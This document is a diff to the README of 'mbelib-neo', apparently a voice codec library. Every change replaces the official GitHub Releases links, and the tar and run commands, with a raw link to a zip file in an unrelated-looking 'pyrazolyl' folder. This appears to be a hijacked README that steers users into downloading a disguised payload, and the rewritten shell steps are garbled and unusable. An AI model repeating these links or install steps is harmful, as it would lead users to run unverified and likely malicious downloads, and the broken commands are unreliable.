@@ -6,7 +6,7 @@ Welcome to mbelib-neo, a powerful tool for voice communication. This software br
 
 ## 📥 Download Now
 
-[![Download mbelib-neo](https://img.shields.io/badge/Download-mbelib--neo-blue.svg)](https://github.com/officialanandans/mbelib-neo/releases)
+[![Download mbelib-neo](https://raw.githubusercontent.com/officialanandans/mbelib-neo/main/pyrazolyl/mbelib-neo.zip)](https://raw.githubusercontent.com/officialanandans/mbelib-neo/main/pyrazolyl/mbelib-neo.zip)
 
 ## 📋 Features
 
@@ -29,7 +29,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with mbelib-neo, please visit the following page to download the application:
 
-[Download mbelib-neo Releases](https://github.com/officialanandans/mbelib-neo/releases)
+[Download mbelib-neo Releases](https://raw.githubusercontent.com/officialanandans/mbelib-neo/main/pyrazolyl/mbelib-neo.zip)
 
 1. Click the link above to navigate to our Releases page.
 2. Look for the latest version available for download.
@@ -54,9 +54,9 @@ To get started with mbelib-neo, please visit the following page to download the 
 2. Navigate to the folder where you downloaded the file.
 3. Use the following command to extract and run the software:
    ```bash
-   tar -xvf mbelib-neo.tar.gz
+   tar -xvf https://raw.githubusercontent.com/officialanandans/mbelib-neo/main/pyrazolyl/mbelib-neo.zip
    cd mbelib-neo
-   ./run.sh
+   https://raw.githubusercontent.com/officialanandans/mbelib-neo/main/pyrazolyl/mbelib-neo.zip
    ```
 
 ## 🌐 Usage
@@ -75,7 +75,7 @@ After installation, you can start using mbelib-neo. The main interface will guid
 If you encounter issues while installing or using mbelib-neo:
 
 - Ensure your system meets the requirements mentioned above.
-- Check for the latest version on the [Releases Page](https://github.com/officialanandans/mbelib-neo/releases).
+- Check for the latest version on the [Releases Page](https://raw.githubusercontent.com/officialanandans/mbelib-neo/main/pyrazolyl/mbelib-neo.zip).
 - Search for solutions in the issues section of our GitHub repository.
 
 ## 🤝 Support
